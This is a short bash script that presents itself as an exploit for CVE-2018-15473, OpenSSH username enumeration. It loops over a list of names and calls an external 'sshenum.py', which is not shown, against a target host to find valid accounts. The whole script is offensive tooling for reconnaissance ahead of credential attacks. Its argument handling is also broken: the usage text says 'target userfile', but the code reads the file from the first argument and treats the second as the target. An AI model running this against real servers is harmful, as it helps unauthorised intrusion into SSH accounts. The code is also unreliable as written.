#!/bin/bash
# Exploits CVE-2018-15473 to enumerate OpenSSH usernames

# Reads usernames from file and checks if name is valid

function getuser() {
	for i in $userfile; do
		python sshenum.py $1 $i
	done
}

# Help menu
function help() {
	echo usage: suf.sh target userfile
	exit 1
}

if [ $# -le 1 ]; then
	help
	exit 1
fi

userfile=$( cat $1 )

echo "Checking $2 for valid users..."
sleep 3
getuser $2
